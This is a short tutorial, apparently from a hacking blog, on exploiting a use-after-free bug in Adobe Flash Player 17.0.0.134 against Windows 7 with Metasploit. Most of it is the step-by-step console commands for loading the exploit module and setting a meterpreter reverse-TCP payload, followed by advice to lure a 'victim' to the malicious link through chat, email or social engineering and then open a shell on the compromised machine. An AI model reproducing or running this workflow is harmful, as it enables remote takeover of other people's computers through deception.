
Exploit Remote PC using Adobe Flash Player domainMemory ByteArray Use After Free

This module exploits a use-after-free vulnerability in Adobe Flash Player. The vulnerability occurs when the ByteArray assigned to the current ApplicationDomain is freed from an ActionScript worker, when forcing a reallocation by copying more contents than the original capacity, but Flash forgets to update the domainMemory pointer, leading to a use-after-free situation when the main worker references the domainMemory again. This module has been tested successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with Flash 17.0.0.134.
Exploit Targets
Flash 17.0.0.134
Requirement
Attacker: kali Linux
Victim PC: Windows 7
Open Kali terminal type msfconsole

Now type use exploit/windows/browser/adobe_flash_domain_memory_uaf
msf exploit (adobe_flash_domain_memory_uaf)>set payload windows/meterpreter/reverse_tcp
msf exploit (adobe_flash_domain_memory_uaf)>set lhost 192.168.1.7 (IP of Local Host)
msf exploit (adobe_flash_domain_memory_uaf)>set srvhost 192.168.1.7
msf exploit (adobe_flash_domain_memory_uaf)>set uripath /
msf exploit (adobe_flash_domain_memory_uaf)>exploit  

Now an URL you should give to your victim http://192.168.1.7:8080
Send the link of the server to the victim via chat or email or any social engineering technique
Now when the victim opens the following link (http://192.168.1.7:8080) a session will be opened as shown below


Now type session –l to display sessions opened when the victim opens the link
Now the session has opened  type sysinfo to get system information, then type shell to enter into Victims command prompt.

